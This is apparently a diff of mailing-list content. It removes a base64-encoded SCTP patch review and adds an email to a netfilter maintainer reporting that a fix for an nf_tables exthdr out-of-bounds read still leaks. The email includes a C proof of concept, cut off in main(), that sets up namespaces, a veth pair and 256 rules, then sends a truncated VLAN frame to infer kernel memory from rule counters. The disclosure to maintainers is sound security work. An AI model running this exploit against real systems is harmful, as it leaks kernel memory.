-Lm1heGxlbiA9IHNpemVvZih1bnNpZ25lZCBpbnQpOw0KPiA+IEBAIC00NTMsOCArNDU0LDkgQEAg
-c3RhdGljIGludCBwcm9jX3NjdHBfZG9fcnRvX21heChjb25zdCBzdHJ1Y3QgIA0KPiBjdGxfdGFi
-bGUgKmN0bCwgaW50IHdyaXRlLA0KPiA+ICAgICAgICAgc3RydWN0IG5ldCAqbmV0ID0gY29udGFp
-bmVyX29mKGN0bC0+ZGF0YSwgc3RydWN0IG5ldCwgIA0KPiBzY3RwLnJ0b19tYXgpOw0KPiA+ICAg
-ICAgICAgdW5zaWduZWQgaW50IG1pbiA9ICoodW5zaWduZWQgaW50ICopIGN0bC0+ZXh0cmExOw0K
-PiA+ICAgICAgICAgdW5zaWduZWQgaW50IG1heCA9ICoodW5zaWduZWQgaW50ICopIGN0bC0+ZXh0
-cmEyOw0KPiA+ICsgICAgICAgaW50IG5ld192YWx1ZSA9IG5ldC0+c2N0cC5ydG9fbWF4Ow0KPiA+
-ICAgICAgICAgc3RydWN0IGN0bF90YWJsZSB0Ymw7DQo+ID4gLSAgICAgICBpbnQgcmV0LCBuZXdf
-dmFsdWU7DQo+ID4gKyAgICAgICBpbnQgcmV0Ow0KPiA+DQo+ID4gICAgICAgICBtZW1zZXQoJnRi
-bCwgMCwgc2l6ZW9mKHN0cnVjdCBjdGxfdGFibGUpKTsNCj4gPiAgICAgICAgIHRibC5tYXhsZW4g
-PSBzaXplb2YodW5zaWduZWQgaW50KTsNCj4gPiBAQCAtNDg5LDggKzQ5MSw5IEBAIHN0YXRpYyBp
-bnQgcHJvY19zY3RwX2RvX2F1dGgoY29uc3Qgc3RydWN0IGN0bF90YWJsZSAgDQo+ICpjdGwsIGlu
-dCB3cml0ZSwNCj4gPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZvaWQgKmJ1ZmZlciwg
-c2l6ZV90ICpsZW5wLCBsb2ZmX3QgKnBwb3MpDQo+ID4gIHsNCj4gPiAgICAgICAgIHN0cnVjdCBu
-ZXQgKm5ldCA9IGNvbnRhaW5lcl9vZihjdGwtPmRhdGEsIHN0cnVjdCBuZXQsICANCj4gc2N0cC5h
-dXRoX2VuYWJsZSk7DQo+ID4gKyAgICAgICBpbnQgbmV3X3ZhbHVlID0gbmV0LT5zY3RwLmF1dGhf
-ZW5hYmxlOw0KPiA+ICAgICAgICAgc3RydWN0IGN0bF90YWJsZSB0Ymw7DQo+ID4gLSAgICAgICBp
-bnQgbmV3X3ZhbHVlLCByZXQ7DQo+ID4gKyAgICAgICBpbnQgcmV0Ow0KPiA+DQo+ID4gICAgICAg
-ICBtZW1zZXQoJnRibCwgMCwgc2l6ZW9mKHN0cnVjdCBjdGxfdGFibGUpKTsNCj4gPiAgICAgICAg
-IHRibC5tYXhsZW4gPSBzaXplb2YodW5zaWduZWQgaW50KTsNCj4gPiBAQCAtNTIyLDggKzUyNSw5
-IEBAIHN0YXRpYyBpbnQgcHJvY19zY3RwX2RvX3VkcF9wb3J0KGNvbnN0IHN0cnVjdCAgDQo+IGN0
-bF90YWJsZSAqY3RsLCBpbnQgd3JpdGUsDQo+ID4gICAgICAgICBzdHJ1Y3QgbmV0ICpuZXQgPSBj
-b250YWluZXJfb2YoY3RsLT5kYXRhLCBzdHJ1Y3QgbmV0LCAgDQo+IHNjdHAudWRwX3BvcnQpOw0K
-PiA+ICAgICAgICAgdW5zaWduZWQgaW50IG1pbiA9ICoodW5zaWduZWQgaW50ICopY3RsLT5leHRy
-YTE7DQo+ID4gICAgICAgICB1bnNpZ25lZCBpbnQgbWF4ID0gKih1bnNpZ25lZCBpbnQgKiljdGwt
-PmV4dHJhMjsNCj4gPiArICAgICAgIGludCBuZXdfdmFsdWUgPSBuZXQtPnNjdHAudWRwX3BvcnQ7
-DQo+ID4gICAgICAgICBzdHJ1Y3QgY3RsX3RhYmxlIHRibDsNCj4gPiAtICAgICAgIGludCByZXQs
-IG5ld192YWx1ZTsNCj4gPiArICAgICAgIGludCByZXQ7DQo+ID4NCj4gPiAgICAgICAgIG1lbXNl
-dCgmdGJsLCAwLCBzaXplb2Yoc3RydWN0IGN0bF90YWJsZSkpOw0KPiA+ICAgICAgICAgdGJsLm1h
-eGxlbiA9IHNpemVvZih1bnNpZ25lZCBpbnQpOw0KPiA+IEBAIC01NDEsMTggKzU0NSwyMCBAQCBz
-dGF0aWMgaW50IHByb2Nfc2N0cF9kb191ZHBfcG9ydChjb25zdCBzdHJ1Y3QgIA0KPiBjdGxfdGFi
-bGUgKmN0bCwgaW50IHdyaXRlLA0KPiA+ICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAt
-RUlOVkFMOw0KPiA+DQo+ID4gICAgICAgICAgICAgICAgIG11dGV4X2xvY2soJnNjdHBfc3lzY3Rs
-X211dGV4KTsNCj4gPiAtICAgICAgICAgICAgICAgbmV0LT5zY3RwLnVkcF9wb3J0ID0gbmV3X3Zh
-bHVlOw0KPiA+IC0gICAgICAgICAgICAgICBzY3RwX3VkcF9zb2NrX3N0b3AobmV0KTsNCj4gPiAt
-ICAgICAgICAgICAgICAgaWYgKG5ld192YWx1ZSkgew0KPiA+IC0gICAgICAgICAgICAgICAgICAg
-ICAgIHJldCA9IHNjdHBfdWRwX3NvY2tfc3RhcnQobmV0KTsNCj4gPiAtICAgICAgICAgICAgICAg
-ICAgICAgICBpZiAocmV0KQ0KPiA+IC0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV0
-LT5zY3RwLnVkcF9wb3J0ID0gMDsNCj4gPiArICAgICAgICAgICAgICAgaWYgKG5ld192YWx1ZSAh
-PSBuZXQtPnNjdHAudWRwX3BvcnQpIHsNCj4gPiArICAgICAgICAgICAgICAgICAgICAgICBuZXQt
-PnNjdHAudWRwX3BvcnQgPSBuZXdfdmFsdWU7DQo+ID4gKyAgICAgICAgICAgICAgICAgICAgICAg
-c2N0cF91ZHBfc29ja19zdG9wKG5ldCk7DQo+ID4gKyAgICAgICAgICAgICAgICAgICAgICAgaWYg
-KG5ld192YWx1ZSkgew0KPiA+ICsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0ID0g
-c2N0cF91ZHBfc29ja19zdGFydChuZXQpOw0KPiA+ICsgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgaWYgKHJldCkNCj4gPiArICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgbmV0LT5zY3RwLnVkcF9wb3J0ID0gMDsNCj4gPiArICAgICAgICAgICAgICAgICAgICAgICB9
-DQoNCiAgICAgbmV0LT5zY3RwLnVkcF9wb3J0IGlzIG11dGF0ZWQgdW5kZXIgc2N0cF9zeXNjdGxf
-bXV0ZXgsIGluY2x1ZGluZyBhICANCnRyYW5zaWVudA0KICAgICBzdG9yZSBvZiBuZXdfdmFsdWUg
-YmVmb3JlIHNjdHBfdWRwX3NvY2tfc3RhcnQoKSBjYW4gZmFpbCBhbmQgcmVzZXQgaXQgIA0KdG8g
-MC4NCiAgICAgUmVhZGluZyBuZXQtPnNjdHAudWRwX3BvcnQgb3V0c2lkZSBzY3RwX3N5c2N0bF9t
-dXRleCAoYW5kIHdpdGhvdXQgIA0KUkVBRF9PTkNFKCkpDQogICAgIGJvdGggaW50cm9kdWNlcyBh
-IG5ldyBLQ1NBTiBkYXRhIHJhY2Ugb24gZXZlcnkgcmVhZC93cml0ZSBvZiB1ZHBfcG9ydCAgDQph
-bmQNCiAgICAgY3JlYXRlcyBhIFRPQ1RPVSByYWNlIGZvciB0aGUgaWdub3JlZC13cml0ZSBjYXNl
-Og0KDQogICAgICAgMS4gSW5pdGlhbCBuZXQtPnNjdHAudWRwX3BvcnQgPT0gMC4NCiAgICAgICAy
-LiBUaHJlYWQgQSBzdGFydHMgYSBuby1vcCB3cml0ZSAoZS5nLiAqbGVucCA9PSAwIG9yIHRyYWls
-aW5nICJcbiIgYXQNCiAgICAgICAgICAqcHBvcyA+IDApIGFuZCByZWFkcyBuZXdfdmFsdWUgPSAw
-IGJlZm9yZSBsb2NraW5nICANCnNjdHBfc3lzY3RsX211dGV4Lg0KICAgICAgIDMuIFRocmVhZCBC
-IHdyaXRlcyAiOTg5OSIgYXQgKnBwb3MgPT0gMCwgdGFrZXMgc2N0cF9zeXNjdGxfbXV0ZXgsIHNl
-dHMNCiAgICAgICAgICBuZXQtPnNjdHAudWRwX3BvcnQgPSA5ODk5LCBzdGFydHMgdGhlIFVEUCB0
-dW5uZWwgc29ja2V0cywgYW5kICANCnVubG9ja3MuDQogICAgICAgNC4gVGhyZWFkIEEncyBwcm9j
-X2RvaW50dmVjKCkgaWdub3JlcyB0aGUgd3JpdGUgYW5kIHJldHVybnMgMCB3aXRoDQogICAgICAg
-ICAgbmV3X3ZhbHVlIHN0aWxsIDAuIFRocmVhZCBBIHRha2VzIHNjdHBfc3lzY3RsX211dGV4LCBz
-ZWVzDQogICAgICAgICAgbmV3X3ZhbHVlICgwKSAhPSBuZXQtPnNjdHAudWRwX3BvcnQgKDk4OTkp
-LCB0ZWFycyBkb3duIFRocmVhZCBCJ3MgIA0KVURQDQogICAgICAgICAgc29ja2V0cywgYW5kIHJl
-c2V0cyBuZXQtPnNjdHAudWRwX3BvcnQgPSAwLg0KDQogICAgIENvbnZlcnNlbHksIGlmIFRocmVh
-ZCBBIHJlYWRzIG5ldC0+c2N0cC51ZHBfcG9ydCB3aGlsZSBUaHJlYWQgQiBpcyAgDQppbnNpZGUg
-YQ0KICAgICBmYWlsaW5nIHNjdHBfdWRwX3NvY2tfc3RhcnQoKSwgVGhyZWFkIEEncyBpZ25vcmVk
-IHdyaXRlIGNhcHR1cmVzIHRoZSAgDQp0cmFuc2llbnQNCiAgICAgcG9ydCBhbmQgY2FuIGF0dGVt
-cHQgdG8gYmluZCBpdCBhZnRlciBUaHJlYWQgQiByb2xscyBuZXQtPnNjdHAudWRwX3BvcnQgIA0K
-YmFjaw0KICAgICB0byAwLg0KDQogICAgIFNpbmNlIHByb2Nfc3lzX2NhbGxfaGFuZGxlcigpIGFs
-cmVhZHkgY29waWVzIHRoZSB3cml0ZSBidWZmZXIgaW50byAgDQprZXJuZWwNCiAgICAgbWVtb3J5
-IGJlZm9yZSBpbnZva2luZyAtPnByb2NfaGFuZGxlcigpLCBoYW5kbGUgIXdyaXRlIHdpdGggYW4g
-ZWFybHkNCiAgICAgYHJldHVybiBwcm9jX2RvaW50dmVjKGN0bCwgd3JpdGUsIGJ1ZmZlciwgbGVu
-cCwgcHBvcyk7YCBhbmQgYWNxdWlyZQ0KICAgICBzY3RwX3N5c2N0bF9tdXRleCBiZWZvcmUgaW5p
-dGlhbGl6aW5nIGBuZXdfdmFsdWUgPSBuZXQtPnNjdHAudWRwX3BvcnRgICANCmFuZA0KICAgICBj
-YWxsaW5nIHByb2NfZG9pbnR2ZWMoKSBvbiB3cml0ZXMgKHVzaW5nIFdSSVRFX09OQ0UoKSBmb3Ig
-dGhlIHN0b3JlcyAgDQp1bmRlcg0KICAgICB0aGUgbXV0ZXggc28gbG9ja2xlc3MgcmVhZGVycyBz
-dGF5IEtDU0FOLWNsZWFuKS4NCj4gPiArDQo+ID4gKyAgICAgICAgICAgICAgICAgICAgICAgLyog
-VXBkYXRlIHRoZSB2YWx1ZSBpbiB0aGUgY29udHJvbCBzb2NrZXQgKi8NCj4gPiArICAgICAgICAg
-ICAgICAgICAgICAgICBsb2NrX3NvY2soc2spOw0KPiA+ICsgICAgICAgICAgICAgICAgICAgICAg
-IHNjdHBfc2soc2spLT51ZHBfcG9ydCA9ICANCj4gaHRvbnMobmV0LT5zY3RwLnVkcF9wb3J0KTsN
-Cj4gPiArICAgICAgICAgICAgICAgICAgICAgICByZWxlYXNlX3NvY2soc2spOw0KPiA+ICAgICAg
-ICAgICAgICAgICB9DQo+ID4gLQ0KPiA+IC0gICAgICAgICAgICAgICAvKiBVcGRhdGUgdGhlIHZh
-bHVlIGluIHRoZSBjb250cm9sIHNvY2tldCAqLw0KPiA+IC0gICAgICAgICAgICAgICBsb2NrX3Nv
-Y2soc2spOw0KPiA+IC0gICAgICAgICAgICAgICBzY3RwX3NrKHNrKS0+dWRwX3BvcnQgPSBodG9u
-cyhuZXQtPnNjdHAudWRwX3BvcnQpOw0KPiA+IC0gICAgICAgICAgICAgICByZWxlYXNlX3NvY2so
-c2spOw0KPiA+ICAgICAgICAgICAgICAgICBtdXRleF91bmxvY2soJnNjdHBfc3lzY3RsX211dGV4
-KTsNCj4gPiAgICAgICAgIH0NCj4gPg0KPiA+IEBAIC01NjQsOCArNTcwLDkgQEAgc3RhdGljIGlu
-dCBwcm9jX3NjdHBfZG9fcHJvYmVfaW50ZXJ2YWwoY29uc3Qgc3RydWN0ICANCj4gY3RsX3RhYmxl
-ICpjdGwsIGludCB3cml0ZSwNCj4gPiAgew0KPiA+ICAgICAgICAgc3RydWN0IG5ldCAqbmV0ID0g
-Y29udGFpbmVyX29mKGN0bC0+ZGF0YSwgc3RydWN0IG5ldCwNCj4gPiAgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICBzY3RwLnByb2JlX2ludGVydmFsKTsNCj4gPiArICAgICAg
-IGludCBuZXdfdmFsdWUgPSBuZXQtPnNjdHAucHJvYmVfaW50ZXJ2YWw7DQo+ID4gICAgICAgICBz
-dHJ1Y3QgY3RsX3RhYmxlIHRibDsNCj4gPiAtICAgICAgIGludCByZXQsIG5ld192YWx1ZTsNCj4g
-PiArICAgICAgIGludCByZXQ7DQo+ID4NCj4gPiAgICAgICAgIG1lbXNldCgmdGJsLCAwLCBzaXpl
-b2Yoc3RydWN0IGN0bF90YWJsZSkpOw0KPiA+ICAgICAgICAgdGJsLm1heGxlbiA9IHNpemVvZih1
-bnNpZ25lZCBpbnQpOw0KPiA+IC0tDQo+ID4gMi41Ni4xLjcwOC5nNzc1NzBhNmExZC1nb29nDQo+
-ID4NCg0KPiBBY2tlZC1ieTogWGluIExvbmcgPGx1Y2llbi54aW5AZ21haWwuY29tPg0KDQoNCg==
+On Wed, Nov 25, 2026 at 5:39=E2=80=AFPM Pablo Neira Ayuso <pablo@netfilter.=
+org> wrote:
+>
+> On Thu, Nov 26, 2026 at 01:29:55AM +0100, Pablo Neira Ayuso wrote:
+> > On Wed, Nov 25, 2026 at 05:11:51PM -0700, Xiang Mei wrote:
+> [...]
+> > > Pull the header before the call, as act_ct, virtio_net_hdr_to_skb() a=
+nd
+> > > nft_set_pktinfo_ipv6_ingress() already do.
+>
+> I prefer this patch (see attachment).
+>
+> Please, don't take, I will submit it myself including your
+> Reported-by: tag.
+>
+> Thanks.
+
+Sorry, I replied only to Pablo earlier. A resend of my test:
+
+Thanks for the patch. I have just tested it agaist the PoC (attached to
+this mail) but it still leaks.
+
+The 18-byte 802.1Q frame still makes ipv6_find_hdr() read past the
+tail, same as the unpatched kernel. The pull in validate fails, we
+fall back to nft_set_pktinfo_unspec(), and nft_do_chain_netdev() still
+runs the chain, so exthdr gets called with only the skb->protocol
+check.
+
+I think exthdr still needs its own check, or the netdev/bridge chains
+should not evaluate rules against an skb that failed validation. Your
+change still looks useful on top of that for the frags case.
+
+One more thing: nft_meta.c calls __nft_set_pktinfo_ipv6_validate()
+with a non-zero nhoff for VLAN/PPPoE, but the new code pulls and reads
+the header at offset 0, so it checks the outer header there.
+
+Thanks,
+Xiang
+
+The PoC:
+```c
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <grp.h>
+#include <sys/prctl.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <linux/if_packet.h>
+#include <linux/if_ether.h>
+
+#define NFNL_SUBSYS_NFTABLES    10
+#define NFNL_MSG_BATCH_BEGIN    16
+#define NFNL_MSG_BATCH_END      17
+#define NFT_MSG_NEWTABLE        0
+#define NFT_MSG_NEWCHAIN        3
+#define NFT_MSG_NEWRULE         6
+#define NFT_MSG_GETRULE         7
+#define NFTA_TABLE_NAME         1
+#define NFTA_CHAIN_TABLE        1
+#define NFTA_CHAIN_NAME         3
+#define NFTA_CHAIN_HOOK         4
+#define NFTA_CHAIN_TYPE         7
+#define NFTA_HOOK_HOOKNUM       1
+#define NFTA_HOOK_PRIORITY      2
+#define NFTA_HOOK_DEV           3
+#define NFTA_RULE_TABLE         1
+#define NFTA_RULE_CHAIN         2
+#define NFTA_RULE_EXPRESSIONS   4
+#define NFTA_RULE_USERDATA      7
+#define NFTA_LIST_ELEM          1
+#define NFTA_EXPR_NAME          1
+#define NFTA_EXPR_DATA          2
+#define NFTA_EXTHDR_DREG        1
+#define NFTA_EXTHDR_TYPE        2
+#define NFTA_EXTHDR_OFFSET      3
+#define NFTA_EXTHDR_LEN         4
+#define NFTA_EXTHDR_FLAGS       5
+#define NFT_EXTHDR_F_PRESENT    1
+#define NFTA_CMP_SREG           1
+#define NFTA_CMP_OP             2
+#define NFTA_CMP_DATA           3
+#define NFTA_DATA_VALUE         1
+#define NFTA_COUNTER_PACKETS    2
+#define NFPROTO_NETDEV          5
+#define NFT_REG_1               1
+#ifndef NETLINK_NETFILTER
+#define NETLINK_NETFILTER       12
+#endif
+
+#define ROUNDS          64
+
+struct nfgen { uint8_t family, version; uint16_t res_id; };
+
+static int nl, pfd, ifi;
+static uint32_t seq =3D 1;
+static uint64_t cnt[256];
+
+static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m,
+strerror(errno)); exit(1); }
+
+static char *put(char *p, int type, const void *d, int len)
+{
+        struct nlattr *a =3D (struct nlattr *)p;
+
+        a->nla_type =3D type;
+        a->nla_len =3D NLA_HDRLEN + len;
+        memcpy(p + NLA_HDRLEN, d, len);
+        memset(p + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);
+        return p + NLA_ALIGN(a->nla_len);
+}
+static char *put_str(char *p, int t, const char *s) { return put(p, t,
+s, strlen(s) + 1); }
+static char *put_be32(char *p, int t, uint32_t v) { v =3D htonl(v);
+return put(p, t, &v, 4); }
+static char *nest(char **p, int type)
+{
+        struct nlattr *a =3D (struct nlattr *)*p;
+
+        a->nla_type =3D type | NLA_F_NESTED;
+        *p +=3D NLA_HDRLEN;
+        return (char *)a;
+}
+static void nest_end(char *a, char *p) { ((struct nlattr *)a)->nla_len
+=3D p - a; }
+
+/* ---------------------------------------------------------------- setup *=
+/
+
+static void write_file(const char *path, const char *s)
+{
+        int fd =3D open(path, O_WRONLY);
+
+        if (fd < 0 || write(fd, s, strlen(s)) < 0)
+                die(path);
+        close(fd);
+}
+
+static void enter_ns(void)
+{
+        char map[32];
+        uid_t uid =3D getuid();
+        gid_t gid =3D getgid();
+
+        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
+                die("unshare");
+        write_file("/proc/self/setgroups", "deny");
+        snprintf(map, sizeof(map), "0 %d 1", uid);
+        write_file("/proc/self/uid_map", map);
+        snprintf(map, sizeof(map), "0 %d 1", gid);
+        write_file("/proc/self/gid_map", map);
+}
+
+static void rtnl_veth(void)
+{
+        char buf[512] =3D {}, *p, *li, *id, *peer;
+        struct nlmsghdr *h =3D (struct nlmsghdr *)buf;
+        int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+
+        h->nlmsg_type =3D RTM_NEWLINK;
+        h->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
+        p =3D (char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct ifinfomsg))=
+;
+        p =3D put_str(p, IFLA_IFNAME, "vp0");
+        li =3D nest(&p, IFLA_LINKINFO);
+        p =3D put(p, IFLA_INFO_KIND, "veth", 4);
+        id =3D nest(&p, IFLA_INFO_DATA);
+        peer =3D nest(&p, 1 /* VETH_INFO_PEER */);
+        p +=3D sizeof(struct ifinfomsg);
+        p =3D put_str(p, IFLA_IFNAME, "vp1");
+        nest_end(peer, p);
+        nest_end(id, p);
+        nest_end(li, p);
+        h->nlmsg_len =3D p - buf;
+        if (fd < 0 || send(fd, buf, h->nlmsg_len, 0) < 0)
+                die("RTM_NEWLINK");
+        close(fd);
+}
+
+static void link_up(const char *name)
+{
+        struct ifreq ifr =3D {};
+        int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
+
+        strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
+        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
+                die("SIOCGIFFLAGS");
+        ifr.ifr_flags |=3D IFF_UP;
+        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
+                die("SIOCSIFFLAGS");
+        close(fd);
+}
+
+/* ------------------------------------------------------------- nftables *=
+/
+
+static char *msg(char *cur, int type, int flags)
+{
+        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
+        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);
+
+        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
+        h->nlmsg_type =3D (NFNL_SUBSYS_NFTABLES << 8) | type;
+        h->nlmsg_flags =3D NLM_F_REQUEST | flags;
+        h->nlmsg_seq =3D ++seq;
+        g->family =3D NFPROTO_NETDEV;
+        return cur + NLMSG_HDRLEN + sizeof(*g);
+}
+static char *msg_end(char *cur, char *p) { ((struct nlmsghdr
+*)cur)->nlmsg_len =3D p - cur; return p; }
+static char *batch(char *cur, int type)
+{
+        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
+        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);
+
+        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
+        h->nlmsg_type =3D type;
+        h->nlmsg_flags =3D NLM_F_REQUEST;
+        h->nlmsg_seq =3D ++seq;
+        h->nlmsg_len =3D NLMSG_HDRLEN + sizeof(*g);
+        g->res_id =3D htons(NFNL_SUBSYS_NFTABLES);
+        return cur + h->nlmsg_len;
+}
+
+static void nft_commit(char *buf, char *end)
+{
+        char rb[8192];
+        int n;
+
+        if (send(nl, buf, end - buf, 0) < 0)
+                die("nft send");
+        while ((n =3D recv(nl, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
+                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;
+
+                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
+                        struct nlmsgerr *e =3D (struct nlmsgerr *)NLMSG_DAT=
+A(r);
+
+                        if (r->nlmsg_type =3D=3D NLMSG_ERROR && e->error) {
+                                errno =3D -e->error;
+                                die("nft batch");
+                        }
+                }
+        }
+}
+
+static char *rule(char *cur, int t)
+{
+        uint8_t ud =3D t, one =3D 1;
+        char *p, *ex, *e, *d, *v;
+
+        p =3D msg(cur, NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND | NLM_F=
+_ACK);
+        p =3D put_str(p, NFTA_RULE_TABLE, "t");
+        p =3D put_str(p, NFTA_RULE_CHAIN, "c");
+        p =3D put(p, NFTA_RULE_USERDATA, &ud, 1);
+        ex =3D nest(&p, NFTA_RULE_EXPRESSIONS);
+
+        e =3D nest(&p, NFTA_LIST_ELEM);                   /* exthdr ipv6
+type t exists */
+        p =3D put_str(p, NFTA_EXPR_NAME, "exthdr");
+        d =3D nest(&p, NFTA_EXPR_DATA);
+        p =3D put_be32(p, NFTA_EXTHDR_DREG, NFT_REG_1);
+        p =3D put(p, NFTA_EXTHDR_TYPE, &ud, 1);
+        p =3D put_be32(p, NFTA_EXTHDR_OFFSET, 0);
+        p =3D put_be32(p, NFTA_EXTHDR_LEN, 1);
+        p =3D put_be32(p, NFTA_EXTHDR_FLAGS, NFT_EXTHDR_F_PRESENT);
+        nest_end(d, p);
+        nest_end(e, p);
+
+        e =3D nest(&p, NFTA_LIST_ELEM);                   /* cmp reg1 =3D=
+=3D 1 */
+        p =3D put_str(p, NFTA_EXPR_NAME, "cmp");
+        d =3D nest(&p, NFTA_EXPR_DATA);
+        p =3D put_be32(p, NFTA_CMP_SREG, NFT_REG_1);
+        p =3D put_be32(p, NFTA_CMP_OP, 0 /* NFT_CMP_EQ */);
+        v =3D nest(&p, NFTA_CMP_DATA);
+        p =3D put(p, NFTA_DATA_VALUE, &one, 1);
+        nest_end(v, p);
+        nest_end(d, p);
+        nest_end(e, p);
+
+        e =3D nest(&p, NFTA_LIST_ELEM);                   /* counter */
+        p =3D put_str(p, NFTA_EXPR_NAME, "counter");
+        nest_end(e, p);
+
+        nest_end(ex, p);
+        return msg_end(cur, p);
+}
+
+static void nft_setup(void)
+{
+        static char buf[65536];
+        char *cur, *p, *hk;
+        int t =3D 0, i;
+
+        nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+        if (nl < 0)
+                die("NETLINK_NETFILTER");
+
+        cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
+        p =3D msg(cur, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK);
+        p =3D put_str(p, NFTA_TABLE_NAME, "t");
+        cur =3D msg_end(cur, p);
+        p =3D msg(cur, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK);
+        p =3D put_str(p, NFTA_CHAIN_TABLE, "t");
+        p =3D put_str(p, NFTA_CHAIN_NAME, "c");
+        p =3D put_str(p, NFTA_CHAIN_TYPE, "filter");
+        hk =3D nest(&p, NFTA_CHAIN_HOOK);
+        p =3D put_be32(p, NFTA_HOOK_HOOKNUM, 0 /* NF_NETDEV_INGRESS */);
+        p =3D put_be32(p, NFTA_HOOK_PRIORITY, 0);
+        p =3D put_str(p, NFTA_HOOK_DEV, "vp1");
+        nest_end(hk, p);
+        cur =3D msg_end(cur, p);
+        cur =3D batch(cur, NFNL_MSG_BATCH_END);
+        nft_commit(buf, cur);
+
+        while (t < 256) {
+                cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
+                for (i =3D 0; i < 32 && t < 256; i++)
+                        cur =3D rule(cur, t++);
+                cur =3D batch(cur, NFNL_MSG_BATCH_END);
+                nft_commit(buf, cur);
+        }
+}
+
+/* nf_tables dumps nests without NLA_F_NESTED, so walk the levels by hand *=
+/
+#define for_each_nla(x, a, len, rem)
+         \
+        for (x =3D (struct nlattr *)(a), rem =3D (len);
+         \
+            rem >=3D NLA_HDRLEN && x->nla_len >=3D NLA_HDRLEN &&
+x->nla_len <=3D rem; \
+            rem -=3D NLA_ALIGN(x->nla_len),
+         \
+            x =3D (struct nlattr *)((char *)x + NLA_ALIGN(x->nla_len)))
+#define NLA_DATA(x)     ((char *)(x) + NLA_HDRLEN)
+#define NLA_LEN(x)      ((x)->nla_len - NLA_HDRLEN)
+
+/* rule -> userdata (T) and expressions/elem/data/COUNTER_PACKETS */
+static void parse_rule(char *a, int len)
+{
+        struct nlattr *r, *el, *ex, *c;
+        int r1, r2, r3, r4, t =3D -1;
+        uint64_t pk =3D 0;
+
+        for_each_nla(r, a, len, r1) {
+                if (r->nla_type =3D=3D NFTA_RULE_USERDATA)
+                        t =3D (uint8_t)NLA_DATA(r)[0];
+                if (r->nla_type !=3D NFTA_RULE_EXPRESSIONS)
+                        continue;
+                for_each_nla(el, NLA_DATA(r), NLA_LEN(r), r2) {
+                        bool counter =3D false;
+
+                        for_each_nla(ex, NLA_DATA(el), NLA_LEN(el), r3) {
+                                if (ex->nla_type =3D=3D NFTA_EXPR_NAME)
+                                        counter =3D
+!strcmp(NLA_DATA(ex), "counter");
+                                else if (ex->nla_type =3D=3D
+NFTA_EXPR_DATA && counter)
+                                        for_each_nla(c, NLA_DATA(ex),
+NLA_LEN(ex), r4)
+                                                if (c->nla_type =3D=3D
+NFTA_COUNTER_PACKETS)
+                                                        pk =3D
+be64toh(*(uint64_t *)NLA_DATA(c));
+                        }
+                }
+        }
+        if (t >=3D 0)
+                cnt[t] =3D pk;
+}
+
+static void read_counters(void)
+{
+        static char rb[1 << 18];
+        char buf[256], *p =3D msg(buf, NFT_MSG_GETRULE, NLM_F_DUMP);
+        int n;
+
+        p =3D put_str(p, NFTA_RULE_TABLE, "t");
+        msg_end(buf, p);
+        if (send(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len, 0) < 0)
+                die("GETRULE");
+        while ((n =3D recv(nl, rb, sizeof(rb), 0)) > 0) {
+                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;
+
+                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
+                        char *a =3D (char *)NLMSG_DATA(r) + sizeof(struct n=
+fgen);
+
+                        if (r->nlmsg_type =3D=3D NLMSG_DONE ||
+r->nlmsg_type =3D=3D NLMSG_ERROR)
+                                return;
+                        parse_rule(a, (char *)r + r->nlmsg_len - a);
+                }
+        }
+}
+
+/* --------------------------------------------------------------- probes *=
+/
+
+static void tx(const unsigned char *f, int len, uint16_t proto)
+{
+        struct sockaddr_ll sll =3D {};
+
+        sll.sll_family =3D AF_PACKET;
+        sll.sll_ifindex =3D ifi;
+        sll.sll_protocol =3D htons(proto);
+        sll.sll_halen =3D ETH_ALEN;
+        if (sendto(pfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < =
+0)
+                die("sendto");
+}
+
+int main(void)
+{
+        unsigned char probe[18] =3D {
+                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x02, 0x02, 0x02,
+0x02, 0x02, 0x02,
+                0x81, 0x00,             /* ETH_P_8021Q */
+                0x00, 0x64,             /* vid 100 */
+                0x86, 0xdd,             /* inner: ETH_P_IPV6, then nothing =
+*/
+        };
+        uint64_t before[256];
+        cpu_set_t cs;
